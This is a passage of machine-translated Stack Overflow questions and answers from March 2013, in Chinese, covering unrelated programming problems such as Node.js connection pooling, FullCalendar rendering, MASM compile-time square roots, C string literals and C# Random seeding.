function requestTest() {
    http.request({ host: 'www.google.com', method: 'GET' }, function(res) {
        console.log('Completed ' + (requestNo++));

        if (requestNo <= maxRequests) {
            requestTest();
        }
    }).end();
}

requestTest(); 
```

它一个接一个地向 google.com 发出 2000 个 HTTP 请求。问题是它到达请求 5 并暂停大约 3 分钟，然后继续处理请求 6 - 10，然后再暂停 3 分钟，然后请求 11 - 15，暂停，依此类推。**编辑：** *我尝试将 www.google.com 更改为 localhost，这是一个非常基本的 Node.js 应用程序，运行我的机器并返回“Hello world”，但我仍然会暂停 3 分钟。*

现在我读到我可以增加连接池限制：

```
http.globalAgent.maxSockets = 20; 
```

现在，如果我运行它，它会处理请求 1 - 20，然后暂停 3 分钟，然后请求 21 - 40，然后暂停，依此类推。

最后，经过一番研究，我了解到我可以通过设置`agent: false`请求选项来完全禁用连接池：

```
http.request({ host: 'www.google.com', method: 'GET', agent: false }, function(res) {
    ...snip.... 
```

...它会很好地处理所有 2000 个请求。

我的问题，这样做是个好主意吗？是否存在可能导致 HTTP 连接过多的危险？为什么它会暂停 3 分钟，当然，如果我已经完成连接，它应该直接将其添加回池中，为下一个请求使用做好准备，那么为什么要等待 3 分钟呢？原谅我的无知。

如果做不到这一点，对于 Node.js 应用程序发出可能大量的 HTTP 请求，而不会锁定或崩溃的最佳策略是什么？

我在 Mac OSX 10.8.2 上运行 Node.js 版本 0.10。

* * *

**编辑：**我发现如果我将上面的代码转换为一个 for 循环并尝试同时建立一堆连接，我在大约 242 个连接后开始出现错误。错误是：

```
Error was thrown: connect EMFILE
(libuv) Failed to create kqueue (24) 
```

...和代码...

```
for (var i = 1; i <= 2000; i++) {
    (function(requestNo) {
        var request = http.request({ host: 'www.google.com', method: 'GET', agent: false }, function(res) {
            console.log('Completed ' + requestNo);
        });

        request.on('error', function(e) {
            console.log(e.name + ' was thrown: ' + e.message);
        });

        request.end();
    })(i);
} 
```

我不知道一个负载很重的 Node.js 应用程序是否可以同时达到这么多连接。

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2013-03-21T00:46:19.090

您必须消耗响应。

请记住，在 v0.10 中，我们登陆了streams2。这意味着`data`在您开始寻找事件之前不会发生事件。所以，你可以做这样的事情：

```
http.createServer(function(req, res) {
  // this does some I/O, async
  // in 0.8, you'd lose data chunks, or even the 'end' event!
  lookUpSessionInDb(req, function(er, session) {
    if (er) {
      res.statusCode = 500;
      res.end("oopsie");
    } else {
      // no data lost
      req.on('data', handleUpload);
      // end event didn't fire while we were looking it up
      req.on('end', function() {
        res.end('ok, got your stuff');
      });
    }
  });
}); 
```

然而，当你不阅读它时不会丢失数据的流的另一面是，如果你不阅读它，它们***实际上****不会丢失数据！* 也就是说，它们一开始是停顿的，你必须阅读它们才能得到任何东西。

所以，在你的测试中发生的事情是你发出了一堆请求并且*没有消耗响应*，然后最终套接字被谷歌杀死，因为什么都没有发生，它假设你已经死了。

在某些情况下，*无法*使用传入消息：也就是说，如果您没有`response`在请求上添加事件处理程序，或者您`response`在服务器上完全编写和完成消息而无需读取请求。在这些情况下，我们只是为您将数据转储到垃圾中。

但是，如果您正在侦听该`'response'`事件，则处理该对象是您的责任。在您的第一个示例中添加一个`response.resume()`，您将看到它以合理的速度进行处理。

# javascript - JavaScript/FullCalendar - 将事件附加到事件呈现

> ID：15533450
> 
> 赞同：1
> 
> 时间：2013-03-20T19:57:49.430
> 
> 标签：javascript, events, fullcalendar

我的完整代码在这里： http: [//pastebin.com/nctMtX9m](http://pastebin.com/nctMtX9m)

我有一个 FullCalendar 实例，并使用事件对象的“className”属性，在日历呈现后向某些事件添加图标。这些简单的图标指示日历上的工作（事件）是否已发货。

```
$(window).load(function(){
$('a.shipped div span').prepend("<img src=\"/img/truck_white.png\" title=\"Shipped\" alt=\"Shipped\" style=\"padding:2px 5px 5px 0; width=\"16\" height=\"16\" />");}); 
```

这很好用！问题是每当我改变视图时，比如改变月份然后回来，FullCalendar 完全重新呈现事件！这意味着他们现在没有我的图标，因为我的图标添加过程只发生一次，在初始渲染之后。

每次 FullCalendar 呈现事件时，我都需要触发我的图标添加过程。

我发现了这个：[http](http://arshaw.com/fullcalendar/docs/event_data/events_function/) ://arshaw.com/fullcalendar/docs/event_data/events_function/但不幸的是，我的偶数是由 PHP 写入页面的，因此就脚本而言，它们是静态定义的。这个例子让我相信我只能使用外部数据源来做到这一点。这个级别的 JavaScript 诚然不是我的强项。

**如果我的事件数据是静态定义的，如何将我的图标添加过程附加到每次 Fullcalendar 呈现事件时触发的内容？**

谢谢！

**编辑**我发现了如何使用 eventRender 执行我想要的操作，但我似乎无法引用我想要的元素部分，因为现在渲染稍微偏离了。当我找到答案时，我会进一步研究并更新。

**编辑 2**想通了，不能发布答案，因为我是新人。明天会发布答案。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T14:16:53.787

解决方案是使用 eventRender。

```
eventRender: function(event, element) {
if(event.className == 'shipped'){
    var find = '<span class="fc-event-title">';
    var replace = find + '<img src="/img/truck_white.png" title="Shipped" alt="Shipped" class="event_icon" />';
    var newHTML = $(element).html().replace(find, replace);
    $(element).html(newHTML);
}
} 
```

这有点令人费解的查找/替换，但它确实有效。

# node.js - 以像素为单位计算服务器端的文本宽度

> ID：15533456
> 
> 赞同：4
> 
> 时间：2013-03-20T19:58:01.020
> 
> 标签：node.js, meteor

我试图在我的服务器上使用以下代码来估计一些文本字段的长度，并在通过电子邮件发送它们之前可能会修剪它们......

```
String.prototype.visualLength = function()
{
    var element = document.createElement("span");
    element.css({
        "visibility": "hidden",
        "white-space": "nowrap",
        "font-weight": "normal",
        "font-size": "18px",
        "line-height": "40px",
        "font-family": "Helvetica, Arial, sans-serif",
        "text-decoration": "none"
    });
    document.body.appendChild(element);
    element.innerHTML = this;
    return element.offsetWidth;
};

String.prototype.trimToPx = function(length)
{
    var tmp = this;
    var trimmed = this;
    if (tmp.visualLength() > length)
    {
        trimmed += "...";
        while (trimmed.visualLength() > length)
        {
            tmp = tmp.substring(0, tmp.length-1);
            trimmed = tmp + "...";
        }
    };
    return trimmed;
}; 
```

显然我收到一个错误，因为“文档”没有在服务器端定义。我添加了 Meteor 包`htmljs`，`domutils`希望他们能解决这个问题，但徒劳无功。而且我无法添加 Node.js 包`jsdom`，因为显然它在部署的 Meteor 应用程序中不起作用。

知道如何实现我想要做的事情吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T21:47:24.140

我不认为这是可能的。在 node.js 中运行的服务器端代码不在 Web 浏览器渲染环境的上下文中运行，因此无法访问浏览器的 DOM 以及可用的字体和显示配置。即使您成功运行代码并计算了一个数字，当我收到您的电子邮件时，该计算与我的设备无关。字体、显示尺寸和分辨率（可以是台式机，也可以是移动设备）、我自己的配置（例如，我在我的台式机上的 Firefox 中设置了最小字体大小）等。而是尝试以[`em`](https://stackoverflow.com/a/2058892/1172714)单位来定义您的尺寸的像素。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T22:19:53.013

你不能真正依赖客户端会发生什么。即使是 Ubuntu 和 Windows，由于不同的提示、抗锯齿，它们也会显示不同的字体，并且它们可能会对显示的大小产生影响。

如果您将 span 的 css 修改如下，当它的文本大于所需空间时，无论如何，剩余的将显示为...

```
max-width: 10%;
border: 1px #000 solid; // JUST TO SEE the effect clearly
width: 10%;
overflow: hidden;
height: 20px;
text-overflow: ellipsis;
display: block;
white-space: nowrap; 
```

****请注意，**您需要一个合适的高度值，否则文字会落到底部，无法实现您想要的。

试试[http://jsfiddle.net/sG6H2/](http://jsfiddle.net/sG6H2/)

# android - 活动片段已清除索引：-1 是什么意思，我该如何解决？

> ID：15533463
> 
> 赞同：2
> 
> 时间：2013-03-20T19:58:13.350
> 
> 标签：android, android-fragments

我有一个带有自定义滑动菜单的活动，用于类似选项卡的界面。出于某种原因，我的一个（也是唯一一个）片段有这个错误，我似乎无法找到它在做什么。

这是堆栈跟踪。

```
E/FragmentManager(13024): Failure saving state: active SettingsFragment{427b2918} has cleared index: -1
E/FragmentManager(13024): Activity state:
E/AndroidRuntime(13024): FATAL EXCEPTION: main
E/AndroidRuntime(13024): java.lang.IllegalStateException: Failure saving state: active SettingsFragment{427b2918} has cleared index: -1
E/AndroidRuntime(13024):    at android.support.v4.app.FragmentManagerImpl.saveAllState(FragmentManager.java:1700)
E/AndroidRuntime(13024):    at android.support.v4.app.FragmentActivity.onSaveInstanceState(FragmentActivity.java:527)
E/AndroidRuntime(13024):    at com.actionbarsherlock.app.SherlockFragmentActivity.onSaveInstanceState(SherlockFragmentActivity.java:127)
E/AndroidRuntime(13024):    at com.slidingmenu.lib.app.SlidingFragmentActivity.onSaveInstanceState(SlidingFragmentActivity.java:50)
E/AndroidRuntime(13024):    at com.client.activities.BaseMenuActivity.onSaveInstanceState(BaseMenuActivity.java:139) 
```

片段超级简单。它所做的只是继承 SherlockFragment 并覆盖 onCreateView 和 onActivityCreated 来设置视图。它有一些导航到其他片段的按钮。

我什至无法可靠地重现此错误。有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-11-18T15:20:17.533

在这种情况下，我猜当你想附加你的片段时，它看起来像我的代码

```
 case 2:
            ft.replace(R.id.content_frame, **xxxx**, "2");
            ft.detach(**yyyyyyy**);
            ft.attach(**yyyyyyy**); 
```

下面的代码是错误的，正确的代码是

```
 case 2:
            ft.replace(R.id.content_frame, **xxxx**, "2");
            ft.detach(**xxxx**);
            ft.attach(**xxxx**); 
```

也许你有这样的错误，我希望它对你有帮助

# vb.net - 如何使控制台应用程序从文本文件中读取不同的行？

> ID：15533469
> 
> 赞同：0
> 
> 时间：2013-03-20T19:58:28.563
> 
> 标签：vb.net

所以我只是在玩 VB 控制台应用程序，想知道如何读取单个文本文件但读取单独的行。在我的示例中，我正在使用包含用户名和密码形式的假数据的凭证存储。我还不担心加密任何东西，但正如我的问题所述，如何让应用程序读取第 1 行作为站点 a 的用户名，第 2 行作为站点 a 的密码等。抱歉，如果我不太清楚，我如果需要可以进一步详细说明。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T20:15:37.733

如果文件包含交替的用户名和密码行，那么应该这样做：

```
Using file As FileStream = New FileStream(path, ...other constructor options...)
  Using reader As StreamReader = New StreamReader(file)
    While Not reader.EndOfStream
      username = reader.ReadLine
      password = reader.ReadLine
    End While
  End Using
End Using 
```

当然，一切都必须完美排列才能正常工作 - 没有什么是完美的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T20:24:43.780

假设您的文本文件由重复行组成，其中奇数是用户名，偶数是密码然后

```
Dim lines() as String = File.ReadAllLines("FileName.txt")

if (lines.Length MOD 2) <> 0 Then
    Console.WriteLine("Lines not even")
Else

    For i = 0 to lines.Length - 1 Step 2
        Console.WriteLine("User={0} with password={1}", lines(i), lines(i+1))
    Next
End If 
```

仅当文件中的行数完全偶数时才有效

# javascript - 表单验证不适用于电话号码/姓名

> ID：15533470
> 
> 赞同：0
> 
> 时间：2013-03-20T19:58:32.737
> 
> 标签：javascript, jquery, html, css, forms

我一直在尝试制作一个验证电话号码和姓名的表单，但是每当输入提交时，无论字段是否填写，它都会输入相同的消息。消息不断出现，我无法弄清楚

预计到达时间：http : [//jsfiddle.net/6W3uU/](http://jsfiddle.net/6W3uU/)

```
<body>
<form id="contact">
<fieldset id="contactInformation">
<legend>Contact Information</legend>
<p id="error"></p>
<label id="name">Name:</label>
<br>
<input type="text">
<br>
<br>
<label id="phoneNumber">Phone Number:</label>
<br>
<input type="text">
<br>
<br>
<label id="eMail">E-Mail Address:</label>
<br>
<input type="text">
<br>
<br>
<label id="address">Address:</label>
<br>
<input type="text">
<br>
<br>
<label id="city">City:</label>
<br>
<input type="text">
<br>
<br>
<label id="postalCode">Postal Code:</label>
<br>
<input type="text">
<br>
<br>
<label id="province">Province</label>
<br>
<select id="province">
<option id="choose">Choose Your Province</option>
<option id="alberta">Alberta</option>
<option id="britishColumbia">British Columbia</option>
<option id="manitoba">Manitoba</option>
<option id="newBrunswick">New Brunswick</option>
<option id="newfoundland">Newfoundland and Labrador</option>
<option id="northwestTerritories">Northwest Territories</option>
<option id="noviaScotia">Nova Scotia</option>
<option id="nunavut">Nunavut</option>
<option id="ontario">Ontario</option>
<option id="pei">Prince Edward Island</option>
<option id="quebec">Quebec</option>
<option id="saskatchewan">Saskatchewan</option>
<option id="yukon">Yukon Territory</option>
<br>
<br>
<br>
<label id="shippingCheckbox">Is your shipping information the same as your contact information?
<input type="radio" id="sameInfo">
<label>
Yes it is
</label>
<br>
<br>
<input type="radio" id="notSameInfo">
<label>
No it is not
</label>
<br>
<br>
<input type="submit" id="submit" name="submit" value="Submit">
</form>
<br>
<script src="http://code.jquery.com/jquery-latest.min.js"></script>
<script src="js/script.js"></script>
</body>
</html> 
```

这是脚本：

```
//script.js
var errorNotify = 'Sorry, we could not process your request because '
var errorField = [];

function formVal() {
    var isValid = true;

    for (var i = 0; i < errorField.length; i++ ) {
        $(errorField[i]).removeClass('error');
    }
    errorField = [];

    if(!nameCheck()) {
        isValid = false;
    }
    if(!phoneCheck()) {
        isValid = false;
    }
    if (isValid === false) {
        $('#error').html(errorNotify).hide().slideDown('slow');
        for (var i = 0; i < errorField.length; i++) {
            $(errorField[i]).addClass('error');
        }
        errorNotify = 'Sorry, we could not process your request because ';
    }

    function nameCheck(){
        if ($('#name').val() === '') {
            errorNotify += ' you did not enter your name.';
            errorField.push($('#name'));
            return false;
        } else {
            return true;
        }
    }
    function phoneCheck(){
        var phoneCheck = $('#phoneNumber').val();
        if (phoneCheck === '') {
            errorNotify += ' you did not enter your phone number.';
            errorField.push($('#phoneNumber'));
            return false;
        } else if (phoneCheck.length !== 10) {
            errorNotify += 'please enter a 10 digit phone number';
            errorField.push($('#phoneNumber'));
        }
        else if (isNaN(parseInt(phoneCheck))) {
            errorNotify += 'you have entered a letter, please enter a number';
            errorField.push($('#phoneNumber'));
        }
        else {
            return true;
        }
    }
    return isValid;
}
$(function () {
    $('#contact').submit(function() {
        return formVal();
    });
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T20:04:38.307

您在标签标签上有您的 id，而不是输入字段，请更改

```
<label id="name">Name:</label>
<br>
<input type="text"> 
```

到

```
<label for="name">Name:</label>
<br>
<input id="name" type="text"> 
```

ETC

# emacs - Org-Mode Babel，代码块的开关：我可以设置默认值吗？

> ID：15533471
> 
> 赞同：4
> 
> 时间：2013-03-20T19:58:47.520
> 
> 标签：emacs, org-mode, org-babel

在 org 模式下，我可以在我的 org 文件中插入源代码。有很多头参数，我发现了如何设置默认值。所以我只需要开关（这里 -n -r -l ".."）

```
#+BEGIN_SRC emacs-lisp  -n -r -l ";(ref:%s)"
..
#+END_SRC 
```

因为我想将这些用作站点默认值：如何为此类开关设置默认值？

最好的 .emacs，但对文件/缓冲区有效的默认值也会有所帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-26T00:45:13.437

你可以从这个黑客开始

```
(defadvice org-babel-parse-src-block-match  (after org-babel-add-switches activate)
  "Add extra-sw to 3th element of the return value"
  (let ((extra-sw "-t -w 200"))
    (setq v (vconcat ad-return-value))
    (aset v 3 (concat (elt v 3) " " extra-sw))
    (setq ad-return-value (append v nil)))) 
```

# apache - Zend 控制器名称区分大小写

> ID：15533479
> 
> 赞同：0
> 
> 时间：2013-03-20T19:59:16.553
> 
> 标签：apache, zend-framework, case-sensitive, case-insensitive

我正在使用 Zend 框架在 linux 主机上开发应用程序，由于某种原因，当我尝试访问 localhost/index 时，它给了我一个看起来像标准 Apache 404 错误的信息。但是当我去 localhost/Index 它工作。我也可以去 localhost/admin ，它可以正常工作。出于某种原因，我的索引控制器似乎不想工作。我怎样才能到达 localhost/index 工作的地方？

我的 .htaccess 文件看起来不错，并且其中包含正确的重写规则。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T20:45:48.183

我遇到了类似的问题，并将其追溯到 Apache 上的 Options MultiViews。如果您使用的是虚拟主机，请检查那里。如果我记得，如果找不到请求的文件，MultiViews 将尝试查找具有相似名称的其他文件。如果它打开，请尝试禁用它，看看会发生什么。

# assembly - 常数的平方根 (masm, fasm)

> ID：15533480
> 
> 赞同：1
> 
> 时间：2013-03-20T19:59:18.673
> 
> 标签：assembly, masm, x86-16, fasm, square-root

大家好，我需要在程序集源中声明一些常量。在程序的某个部分，我需要这些常量之一的（整数）平方根来限制循环。我的问题是：这甚至可能吗？

到目前为止，我尝试了类似的方法：

```
nMax EQU 200
nLimit EQU sqrt(nMax) ; of course won't assemble... 
                      ; just like nMax^0.5 
```

当然我可以在运行时计算它，但这对我来说是无稽之谈......当然我可以做一个解决方法，比如：

```
nLimit EQU 14
nMax EQU nLimit*nLimit 
```

但通过这种方式，我只能得到 nMax 的完美平方值，而这并不是我所需要的......

谢谢你的帮助！:)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-21T00:25:47.480

您可以使用宏来实现[此 Wikipedia 文章](http://en.wikipedia.org/wiki/Methods_of_computing_square_roots)中描述的许多平方根算法之一。

这是我想出的：

```
NEWTON MACRO S, A
  EXITM <(A + ((S) / (A))) / 2>
ENDM

SQRT MACRO N
  LOCAL V

  IF (N LT 0) OR (N GT 4294967295)
    .ERR ; negative or too large argument
    EXITM <0>
  ENDIF

  IF (N EQ 0) OR (N EQ 1)
    EXITM <N> ; 0 or 1
  ENDIF

  ; calculate approximations of the square root
  ; using Newton's method,
  ; initial approximation is N / 2

  V = NEWTON(N, N / 2)

  V = NEWTON(N, V)
  V = NEWTON(N, V)
  V = NEWTON(N, V)
  V = NEWTON(N, V)

  V = NEWTON(N, V)
  V = NEWTON(N, V)
  V = NEWTON(N, V)
  V = NEWTON(N, V)

  V = NEWTON(N, V)
  V = NEWTON(N, V)
  V = NEWTON(N, V)
  V = NEWTON(N, V)

  V = NEWTON(N, V)
  V = NEWTON(N, V)
  V = NEWTON(N, V)
  V = NEWTON(N, V)

  V = NEWTON(N, V)

  IF (V * V GT N) OR ((V * V) EQ 0)
    EXITM <V - 1> ; return 1 less
                  ; if the approximation is too big
                  ; or
                  ; if its square overflows to 0
  ENDIF

  EXITM <V>
ENDM

.386P

CODE SEGMENT PUBLIC USE32
ASSUME CS:CODE
ORG 0

start:
;mov eax, SQRT(-1)
mov eax, SQRT(0)
mov eax, SQRT(1)
mov eax, SQRT(2)
mov eax, SQRT(15)
mov eax, SQRT(16)
mov eax, SQRT(16+9)
mov eax, SQRT(256)
mov eax, SQRT(65535)
mov eax, SQRT(65536)
mov eax, SQRT(16769025)
mov eax, SQRT(1073676289)
mov eax, SQRT(2147483647)
mov eax, SQRT(2147483648)
mov eax, SQRT(4294705155)
mov eax, SQRT(4294705156)
mov eax, SQRT(4294705157)
mov eax, SQRT(4294967295)
;mov eax, SQRT(4294967296)
ret

CODE ENDS

END start 
```

清单文件：

```
Microsoft (R) Macro Assembler Version 6.14.8444             03/21/13 01:51:53
sqrt.asm                                                     Page 1 - 1
...
 00000000                       CODE SEGMENT PUBLIC USE32
                                ASSUME CS:CODE
                                ORG 0

 00000000                       start:
                                ;mov eax, SQRT(-1)
 00000000  B8 00000000          mov eax, SQRT(0)
 00000005  B8 00000001          mov eax, SQRT(1)
 0000000A  B8 00000001          mov eax, SQRT(2)
 0000000F  B8 00000003          mov eax, SQRT(15)
 00000014  B8 00000004          mov eax, SQRT(16)
 00000019  B8 00000005          mov eax, SQRT(16+9)
 0000001E  B8 00000010          mov eax, SQRT(256)
 00000023  B8 000000FF          mov eax, SQRT(65535)
 00000028  B8 00000100          mov eax, SQRT(65536)
 0000002D  B8 00000FFF          mov eax, SQRT(16769025)
 00000032  B8 00007FFF          mov eax, SQRT(1073676289)
 00000037  B8 0000B504          mov eax, SQRT(2147483647)
 0000003C  B8 0000B504          mov eax, SQRT(2147483648)
 00000041  B8 0000FFFD          mov eax, SQRT(4294705155)
 00000046  B8 0000FFFE          mov eax, SQRT(4294705156)
 0000004B  B8 0000FFFE          mov eax, SQRT(4294705157)
 00000050  B8 0000FFFF          mov eax, SQRT(4294967295)
                                ;mov eax, SQRT(4294967296)
 00000055  C3                   ret

 0056                           CODE ENDS

                                END start
... 
```

# web-applications - 在 IBM Websphere V7 上部署独立于平台的战争

> ID：15533486
> 
> 赞同：3
> 
> 时间：2013-03-20T19:59:35.357
> 
> 标签：web-applications, websphere, jax-ws, web.xml

也许有人可以阐明 War 应用程序中 web.xml 文件中标签的神秘行为——当它部署在 WAS v7 上时。

简而言之，我们有一个发布 JAX-WS Web 服务的 War 应用程序。web.xml 使用“WSServletContextListener”和“WSServlet”以提供独立于 Web 服务平台的部署。发布的 Web 服务由我们使用 Delphi (XE) 构建的客户端使用。这个想法适用于 Java EE 服务器，如 weblogic、Tomcat、JBoss 等。

问题是，当部署在 WAS V7 上时，WSDL（已成功发布）呈现的 WSDL 与其他 Java EE 服务器略有不同。WSDL 中自动创建的“<xsd:import >”标记已从客户端可以破译的 URL 路径更改为我们的客户端程序无法破译的基于文件的路径。只有当我将 web.xml 从 2.5 版降级到 2.4 版时，我才设法修复了这个 WAS 行为。

有谁知道可能是什么问题？

# xpages - XSP 文档级别的 Xpages ACL 验证

> ID：15533491
> 
> 赞同：0
> 
> 时间：2013-03-20T19:59:57.733
> 
> 标签：xpages, lotus-notes, xpages-extlib, xpages-ssjs

是否可以根据源文档的字段值验证 Xpage 的 ACL。

我们需要在 XPage 级别上实现作者和读者能力（根据要求，我不应该使用 ROLES，因为它取决于存储在后端文档 FIELD 中的每个单独的作者）。

请建议该方法，因为我什至没有为按钮寻找 HideWhen（编辑、保存等）

Xpage 中 ACLEntry[0] 中的示例代码：

```
if getComponent("inputText1").getValue()  == sessionScope.user { 
    session.getEffectiveUserName();
} else {
  return false;
} 
```

谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-20T21:57:33.940

我不太了解您在该属性上的代码...

要在 XPage 级别查询读者/作者级别，我建议使用 database.queryAccess 方法（[http://www-10.lotus.com/ldd/ddwiki.nsf/dx/NotesDatabase_sample_JavaScript_code_for_XPages?opendocument&comments#queryAccess](http://www-10.lotus.com/ldd/ddwiki.nsf/dx/NotesDatabase_sample_JavaScript_code_for_XPages?opendocument&comments#queryAccess)）您尝试比较仅用户名。如果您的访问级别是由与您的用户名不相关的组中的成员资格计算的，这可能会失败。

XPages 的 ACL 取决于数据库 ACL，因此您必须在那里设置级别 - 据我所知，XPages 的 ACL 是“真实”ACL 的补充。

我还体验到 reader 字段会影响默认情况下使用 XPage 打开文档的能力。

我希望我的回答不会太令人困惑；-)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-12T20:29:57.480

我认为这个问题是有效的（据我目前所知）：如果我想设计一个工作流应用程序，但当前的审批者不应该编辑整个文档，我只想让他访问部分（即评论字段和审批按钮） ）。

上面的问题以某种方式与访问旧 LN 开发中的受控部分有关。到目前为止我也没有找到好的解决方案

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-04-26T16:31:48.300

您描述的是一个非常常见的工作流程场景。有几种方法可以有效地实现它。这是我要做的：

*   拥有一个（或多个）自定义控件来呈现“有效负载”（请求者填写的字段）
*   将它们组装成一个更大的控件，用于呈现表单
*   根据打开表单的人员和模式（新的、待批准、已批准、已拒绝等）计算要阅读/编辑的模式
*   可选：提交时从作者字段中删除提交者
*   有一个“批准控件”，仅在当前用户是（当前）批准者且状态为“待批准”时显示该控件具有未绑定到文档的字段，而是范围变量
*   批准按钮触发 SSJS，它获取范围变量值并更新文档（并触发通知、访问更改等）

审批组件可用于任何审批表单。然后，您可以考虑不授予批准者写入权限，因为您可以在代码中处理它。

# c - 在c中反转字符串

> ID：15533493
> 
> 赞同：1
> 
> 时间：2013-03-20T19:59:57.957
> 
> 标签：c, string, reverse

我试图将字符串反转到位。

```
void reverseStr(char *str)
{
 int i;
 int length;
 int last_pos;
 length = strlen(str);
 last_pos = length-1;

 for(i = 0; i < length / 2; i++)
 {
   char tmp = str[i];
   str[i] = str[last_pos - i];
   str[last_pos - i] = tmp;
 }
}

Program received signal SIGSEGV, Segmentation fault.
0x0000000000400893 in reverseStr (str=0x400974 "Haus") at main.c:102
102         str[i] = str[last_pos - i];
(gdb) print i
$1 = 0
(gdb) print last_pos
$2 = 3
(gdb) print str
$3 = 0x400974 "Haus"
(gdb) print str[3]
$4 = 115 's' 
```

感谢您的阅读。我不明白，这个指令怎么会导致错误？问候 ：）

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-20T20:01:23.997

中的代码`reverseStr`很好，问题出在调用代码中。您几乎可以肯定将字符串文字或其他一些只读内存传递给函数。

您的调用代码很可能是：

```
char *str = "my string";//str points to a literal which cannot be modified
reverseStr(str); 
```

但是你需要传递可写内存。像这样：

```
char str[] = "my string";
reverseStr(str); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T20:01:43.203

您正在将字符串文字传递给您的函数。字符串文字在 C 中是不可修改的。

```
char *p = "this string is non modifiable";
reverseStr(p); // undefined behavior 
```

改用由字符串初始化的数组：

```
char p[] = "this string is modifiable";
reverseStr(p); // OK 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-20T20:16:48.143

这取决于您如何调用此函数。

*   如果您要传递字符串常量的地址（类型 {char *str = "String"} 的定义被称为字符串常量。Ans 字符串常量被放入可执行文件的 .rodata 部分），那么您将收到异常.
*   如果您要传递数组地址 (char arr[] = "String")，那么该函数将起作用。

# java - 字节算术：如何减去字节变量？

> ID：15533497
> 
> 赞同：2
> 
> 时间：2013-03-20T20:00:13.930
> 
> 标签：java, byte

当我试图做这样的事情时，我遇到了一个错误：

```
byte a = 23;
a = a - 1; 
```

编译器给出了这个错误： Test.java:8: possible loss of precision found : int required: byte a = a - 1; ^ 1 个错误

强制转换不能解决错误......为什么编译器不让我这样做？我是否需要将变量“a”转换为 int？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-20T20:00:47.593

这样做。

```
a = (byte)(a - 1); 
```

当您`a`从其整数值中减去 1 时。因此，要以字节为单位分配结果，您需要进行显式类型转换。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-03-20T20:02:06.860

在 Java 数学中，所有内容都至少`int`在计算之前提升。这称为[二进制数字提升](http://docs.oracle.com/javase/specs/jls/se7/html/jls-5.html#jls-5.6.2)(JLS 5.6.2)。所以这就是编译器找到一个`int`. 要解决此问题，请将整个表达式的结果转换回`byte`：

```
a = (byte) (a - 1); 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-03-20T20:02:53.617

`a = a - 1;`// 这里在减法之前将 a 提升为 int 数据类型，并且 'a-1' 的结果变为 int，不能存储在 byte 中（byte = 8bits and int = 32 bits）。

这就是为什么你必须将它转换为一个字节，如下所示：

```
a = (byte) (a - 1); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-03-20T20:08:16.673

做这个：

```
a -= 1; 
```

您甚至不需要显式转换，编译器/JVM 会为您完成。

如果您将变量类型更改为 int 没有人可以说，只有您提供的信息。

变量类型由您计划使用它执行的任务定义。

如果您的变量 a 计算某人手上的手指，您为什么要使用 int？字节类型已经足够了。

# c# - 如何获得好的随机结果

> ID：15533501
> 
> 赞同：0
> 
> 时间：2013-03-20T20:00:17.740
> 
> 标签：c#, wpf, random

对于某些 TreeView，我想测试项目的背景属性的许多值。

所以我现在有一棵树，里面有 200 个项目。

这些是可能的值：

```
public enum EnumItemState
{ 
    Default,
    Red,
    Green,
    Yellow,
} 
```

现在我想在视图中快速测试不同的值，所以我写了这段代码：

```
 private EnumItemState GetRandomItemState()
    {

        var rand = new Random();

        var val = rand.Next(0, 3);

        switch (val)
        {
            case 0:
                {
                    return EnumItemState.Red;
                }
            case 1:
                {
                    return EnumItemState.Green;
                }
            case 2:
                {
                    return EnumItemState.Yellow;
                }
            default:
                {
                    return EnumItemState.Default;
                }
        }
    } 
```

但这根本不是随机的。一次运行的所有值都相同。

在我的“随机”方法中的某处有断点，我会得到不同的、“更随机”的结果。

这里发生了什么？

如何获得更好的随机结果？

是不是一些优化，所以我所有的随机数都是用相同的时间种子创建的，因此得到相同的结果？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T20:03:51.573

每次调用使用相同值（基于当前时间）播种的方法时，您都会创建一个新的 Random 对象，因此您会不断获得相同的随机值。

改为这样做：

```
void CallingMethod()
{
    Random rnd = new Random();

    for (int i = 0;i < 200;++i)
        EnumItemState state = GetRandomItemState(rnd);
}

private EnumItemState GetRandomItemState(Random rnd)
{
    // Same code you had here, but don't create new instance of Random
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T20:04:52.560

我将假设您在一个紧密的循环中非常频繁地调用它（即，调用之间几乎没有时间）

的默认 ctor`Random`如下所示：

```
public Random() : this(Environment.TickCount)
{
} 
```

看到了`Environment.TickCount`吗？如果您`Random`非常快速地尝试新建多个实例（即，在该滴答计数更改之前），您将有效地获得**完全相同**的随机数序列 - 因此是“PseudoRandom”。

您可以执行以下操作之一：

*   在通话之间等待一段时间
*   手动将种子传递给ctor
*   `System.Security`使用命名空间中的 prngs

# java - 如何“禁用”Java 对象？

> ID：15533508
> 
> 赞同：0
> 
> 时间：2013-03-20T20:00:32.930
> 
> 标签：java, database, invalidation

我有这样的课：

```
public class DatabaseSession {

  public makeCallOne() {...}
  public makeCallTwo() {...}
  public close() { ... }

} 
```

如果用户实例化这个类，我希望他们能够调用 makeCallOne 和 makeCallTwo。但是，如果他们调用 close()，那么随后对 makeCallOne() 或 makeCallTwo() 的任何调用都应返回异常。

